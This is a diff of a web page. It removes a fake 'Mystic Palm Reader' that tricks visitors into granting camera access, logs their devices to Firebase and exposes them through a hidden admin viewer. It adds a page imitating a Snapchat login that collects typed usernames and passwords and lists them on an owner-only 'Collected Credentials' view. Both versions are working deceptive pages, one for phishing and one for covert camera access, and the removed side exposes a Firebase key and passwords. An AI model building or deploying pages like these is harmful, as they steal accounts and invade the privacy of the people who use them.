@@ -1,231 +1,290 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔮 Mystic Palm Reader</title>
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
-        import { getDatabase, ref, set, onValue, update } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyCFk3FYO3_rWYNs4qXX05ZibipmIDmWuoU",
-            authDomain: "astropro-41cd7.firebaseapp.com",
-            databaseURL: "https://astropro-41cd7-default-rtdb.firebaseio.com",
-            projectId: "astropro-41cd7",
-            storageBucket: "astropro-41cd7.appspot.com",
-            messagingSenderId: "292942513920",
-            appId: "1:292942513920:web:686a0d029bbfb3a18915e5",
-            measurementId: "G-5DJ9H32Q46"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-        window.firebaseDB = { db: database, ref, set, onValue, update };
-    </script>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #6e48aa, #9d50bb);
-            color: white;
-            text-align: center;
-            margin: 0;
-            padding: 20px;
-            min-height: 100vh;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(8px);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-        }
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-        }
-        .camera-box {
-            width: 100%;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 20px;
-            margin: 25px 0;
-        }
-        video {
-            width: 100%;
-            border-radius: 8px;
-            display: none;
-        }
-        #palmPlaceholder {
-            width: 100%;
-            border-radius: 8px;
-            display: block;
-        }
-        button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 10px;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #ff5252;
-        }
-        #adminPanel {
-            display: none;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-        }
-        #cameraGrid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        .camera-feed {
-            background: #333;
-            border-radius: 8px;
-            padding: 10px;
-        }
-        .hidden-admin {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-        }
-        .blink {
-            animation: blink 1.5s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Snakechat Credentials Collector</title>
+<style>
+    * {
+        box-sizing: border-box;
+    }
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: Arial, sans-serif;
+        background: #FFFC00;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+    .login-page, .owner-page {
+        background: white;
+        border-radius: 12px;
+        width: 320px;
+        padding: 24px 24px 32px;
+        box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+    .login-page {
+        text-align: center;
+    }
+    h2 {
+        margin-bottom: 20px;
+        font-weight: 700;
+        font-size: 1.8rem;
+        color: #1a1a1a;
+        user-select: none;
+    }
+    input[type="text"], input[type="password"] {
+        width: 100%;
+        padding: 12px 14px;
+        margin-bottom: 14px;
+        border: 1.5px solid #ddd;
+        border-radius: 8px;
+        font-size: 1rem;
+        transition: border-color 0.25s ease;
+    }
+    input[type="text"]:focus, input[type="password"]:focus {
+        outline: none;
+        border-color: #10b981;
+        box-shadow: 0 0 5px rgba(16,185,129,0.4);
+    }
+    button {
+        width: 100%;
+        padding: 12px 0;
+        background: #10b981;
+        border: none;
+        border-radius: 8px;
+        color: white;
+        font-weight: 700;
+        font-size: 1.1rem;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        user-select: none;
+    }
+    button:hover, button:focus {
+        background: #059669;
+        outline: none;
+    }
+    /* Owner switch button */
+    .owner-switch-btn {
+        margin-top: 16px;
+        background: transparent;
+        color: #10b981;
+        font-weight: 600;
+        font-size: 0.9rem;
+        cursor: pointer;
+        border: none;
+        text-decoration: underline;
+        user-select: none;
+        padding: 6px 0;
+        width: auto;
+    }
+    .owner-switch-btn:hover {
+        color: #047857;
+    }
+    /* Owner page styles */
+    .owner-page {
+        max-height: 85vh;
+        width: 400px;
+        padding: 20px 24px 24px;
+        overflow-y: auto;
+    }
+    .owner-header {
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+    }
+    .owner-header h2 {
+        margin: 0;
+        font-size: 1.5rem;
+        color: #065f46;
+    }
+    .cred-list {
+        width: 100%;
+        border-top: 2px solid #d1fae5;
+    }
+    .cred-entry {
+        background: #f0fdf4;
+        margin-top: 12px;
+        border-radius: 8px;
+        padding: 12px 16px;
+        box-shadow: inset 0 0 4px rgba(16,185,129,0.15);
+        font-size: 1rem;
+        color: #065f46;
+        user-select: text;
+    }
+    .cred-entry strong {
+        color: #065f46;
+    }
+    .cred-field {
+        margin-bottom: 6px;
+        word-wrap: break-word;
+    }
+    .owner-page::-webkit-scrollbar {
+        width: 8px;
+    }
+    .owner-page::-webkit-scrollbar-thumb {
+        background: #10b981;
+        border-radius: 4px;
+    }
+    /* Accessibility & focus */
+    button:focus, input:focus {
+        outline-offset: 2px;
+        outline: 2px solid #059669;
+    }
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔮 Mystic Palm Reader</h1>
-        <p>Discover your future by analyzing your palm lines!</p>
-        
-        <div class="camera-box">
-            <img id="palmPlaceholder" src="https://i.imgur.com/JqYeYnW.jpg" alt="Palm Reading Example">
-            <video id="userVideo" autoplay muted></video>
-        </div>
-        
-        <button id="startBtn">✨ Allow Camera Access</button>
-        <button id="analyzeBtn" class="blink" style="display:none;">🔍 Analyzing Your Palm...</button>
 
-        <div class="hidden-admin">
-            <button id="adminBtn">👁️</button>
-            <div id="adminPanel">
-                <h3>Parental Access 🔒</h3>
-                <input type="password" id="secretCode" placeholder="Enter Admin Password">
-                <button id="unlockBtn">Unlock</button>
-                <div id="cameraGrid"></div>
-            </div>
-        </div>
+<!-- Login Page -->
+<div class="login-page" id="loginPage" role="main" aria-label="Login page">
+    <h2>🔐 Snapchat Login</h2>
+    <form id="loginForm" autocomplete="off" novalidate>
+        <input type="text" id="username" name="username" placeholder="Username" required aria-required="true" aria-label="Username" autocomplete="username" />
+        <input type="password" id="password" name="password" placeholder="Password" required aria-required="true" aria-label="Password" autocomplete="current-password" />
+        <button type="submit" aria-label="Submit login credentials">Login</button>
+    </form>
+    <button class="owner-switch-btn" aria-label="Switch to owner view" onclick="ownerLogin()">Owner Login</button>
+</div>
+
+<!-- Owner Page -->
+<div class="owner-page" id="ownerPage" role="main" aria-label="Owner credentials view" style="display:none;">
+    <div class="owner-header">
+        <h2>Collected Credentials</h2>
+        <button id="ownerLogoutBtn" aria-label="Logout owner view" title="Logout">Logout</button>
     </div>
+    <button id="refreshCredListBtn" style="margin-bottom:16px; background:#059669; border:none; border-radius:6px; padding:8px 12px; color:#fff; cursor:pointer;">Refresh List</button>
+    <div id="credList" class="cred-list" aria-live="polite" aria-relevant="additions"></div>
+</div>
 
-    <script>
-        // DOM Elements
-        const startBtn = document.getElementById('startBtn');
-        const analyzeBtn = document.getElementById('analyzeBtn');
-        const palmPlaceholder = document.getElementById('palmPlaceholder');
-        const userVideo = document.getElementById('userVideo');
-        const adminBtn = document.getElementById('adminBtn');
-        const adminPanel = document.getElementById('adminPanel');
-        const secretCode = document.getElementById('secretCode');
-        const unlockBtn = document.getElementById('unlockBtn');
-        const cameraGrid = document.getElementById('cameraGrid');
+<script>
+  // Constants
+  const OWNER_PASSWORD = 'owneraccess123';
 
-        // Firebase
-        const { db, ref, set, onValue, update } = window.firebaseDB;
-        const ADMIN_PASSWORD = "saurabhup60"; // Change this!
-        let deviceId = "device_" + Math.random().toString(36).substr(2, 9);
-        let isAdmin = false;
+  // Get DOM elements
+  const loginPage = document.getElementById('loginPage');
+  const ownerPage = document.getElementById('ownerPage');
+  const loginForm = document.getElementById('loginForm');
+  const credList = document.getElementById('credList');
+  const ownerLogoutBtn = document.getElementById('ownerLogoutBtn');
+  const refreshCredListBtn = document.getElementById('refreshCredListBtn');
 
-        // Check for admin mode
-        if(window.location.hash === "#admin") {
-            showAdminPanel();
-            isAdmin = true;
-        }
+  // Escape HTML utility for security
+  function escapeHtml(text) {
+    return String(text)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#039;");
+  }
 
-        // Child Mode - Camera Access
-        startBtn.addEventListener('click', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                userVideo.srcObject = stream;
-                palmPlaceholder.style.display = 'none';
-                userVideo.style.display = 'block';
-                startBtn.style.display = 'none';
-                analyzeBtn.style.display = 'inline-block';
-                
-                // Save to Firebase
-                set(ref(db, 'cameras/' + deviceId), {
-                    active: true,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Keep alive
-                setInterval(() => {
-                    update(ref(db, 'cameras/' + deviceId), { ping: new Date().toISOString() });
-                }, 5000);
-                
-                // Fake analysis
-                setTimeout(() => {
-                    analyzeBtn.textContent = "🌟 Your Future Looks Bright!";
-                }, 3000);
-            } catch (err) {
-                alert("Could not access camera: " + err.message);
-            }
-        });
+  // Load credentials array from localStorage or return empty array
+  function loadCredentials() {
+    const creds = localStorage.getItem('credentials');
+    try {
+      return creds ? JSON.parse(creds) : [];
+    } catch {
+      localStorage.removeItem('credentials');
+      return [];
+    }
+  }
 
-        // Admin Mode
-        function showAdminPanel() {
-            document.getElementById('startBtn').style.display = 'none';
-            adminPanel.style.display = 'block';
-            
-            unlockBtn.addEventListener('click', () => {
-                if(secretCode.value === ADMIN_PASSWORD) {
-                    loadAllCameras();
-                    secretCode.style.display = 'none';
-                    unlockBtn.style.display = 'none';
-                } else {
-                    alert("Wrong password!");
-                }
-            });
-        }
+  // Save credentials array to localStorage
+  function saveCredentials(creds) {
+    localStorage.setItem('credentials', JSON.stringify(creds));
+  }
 
-        function loadAllCameras() {
-            onValue(ref(db, 'cameras'), (snapshot) => {
-                cameraGrid.innerHTML = '';
-                const cameras = snapshot.val();
-                
-                for(const id in cameras) {
-                    if(cameras[id].active) {
-                        const feed = document.createElement('div');
-                        feed.className = 'camera-feed';
-                        feed.innerHTML = `
-                            <h3>Device ${id}</h3>
-                            <iframe src="${window.location.href.split('#')[0]}?view=${id}" 
-                                    width="100%" height="300"></iframe>
-                        `;
-                        cameraGrid.appendChild(feed);
-                    }
-                }
-            });
-        }
+  // Add a new credential
+  function addCredential(username, password) {
+    const creds = loadCredentials();
+    creds.push({
+      id: Date.now() + '-' + Math.random().toString(36).slice(2),
+      username: username || 'N/A',
+      password: password || 'N/A',
+      timestamp: new Date().toLocaleString()
+    });
+    saveCredentials(creds);
+  }
 
-        // Toggle admin panel
-        adminBtn.addEventListener('click', () => {
-            adminPanel.style.display = adminPanel.style.display === 'block' ? 'none' : 'block';
-        });
-    </script>
+  // Render credentials in owner page
+  function renderCredentials() {
+    const creds = loadCredentials();
+    if (creds.length === 0) {
+      credList.innerHTML = '<p>No credentials collected yet.</p>';
+      return;
+    }
+    credList.innerHTML = '';
+    creds.slice().reverse().forEach(cred => {
+      const div = document.createElement('div');
+      div.className = 'cred-entry';
+      div.setAttribute('tabindex', '0');
+      div.innerHTML = `
+        <div class="cred-field"><strong>Username:</strong> ${escapeHtml(cred.username)}</div>
+        <div class="cred-field"><strong>Password:</strong> ${escapeHtml(cred.password)}</div>
+        <div class="cred-field" style="font-size:0.8rem; color:#064e3b;">Submitted: ${escapeHtml(cred.timestamp)}</div>
+      `;
+      credList.appendChild(div);
+    });
+  }
+
+  // Clear input fields
+  function clearInputs() {
+    loginForm.username.value = '';
+    loginForm.password.value = '';
+    loginForm.username.focus();
+  }
+
+  // Handle form submission
+  loginForm.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const username = loginForm.username.value.trim();
+    const password = loginForm.password.value;
+    if (!username || !password) {
+      alert('Please enter both username and password.');
+      return;
+    }
+    addCredential(username, password);
+    clearInputs();
+    alert('Credentials saved. You remain on this screen.');
+  });
+
+  // Owner logout button click
+  ownerLogoutBtn.addEventListener('click', function() {
+    ownerPage.style.display = 'none';
+    loginPage.style.display = 'flex';
+    clearInputs();
+  });
+
+  // Refresh credentials list button click
+  refreshCredListBtn.addEventListener('click', renderCredentials);
+
+  // Owner login function called by onclick inline attribute
+  function ownerLogin() {
+    const enteredPass = prompt('Enter owner password to access collected credentials:');
+    if (enteredPass === OWNER_PASSWORD) {
+      loginPage.style.display = 'none';
+      ownerPage.style.display = 'flex';
+      renderCredentials();
+      ownerLogoutBtn.focus();
+    } else if (enteredPass !== null) {
+      alert('Incorrect password.');
+    }
+  }
+
+  // Expose ownerLogin to global scope for inline onclick
+  window.ownerLogin = ownerLogin;
+
+  // Initially focus username input on page load
+  loginForm.username.focus();
+</script>
+
 </body>
 </html>
